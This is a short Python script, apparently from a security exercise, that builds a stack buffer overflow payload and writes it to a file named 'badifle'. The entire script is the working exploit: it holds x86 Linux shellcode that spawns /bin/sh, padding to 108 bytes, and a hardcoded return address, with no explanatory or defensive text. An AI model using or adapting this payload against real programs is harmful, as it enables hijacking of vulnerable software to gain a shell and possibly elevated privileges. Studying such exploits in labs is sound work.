import struct 

shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
buffer = 0xbffff140

atk_vector = shellcode
atk_vector += 'A' * (108 - len(atk_vector))
atk_vector += struct.pack('I', buffer)

f = open('badifle', 'w+')
f.write(atk_vector)
f.close()

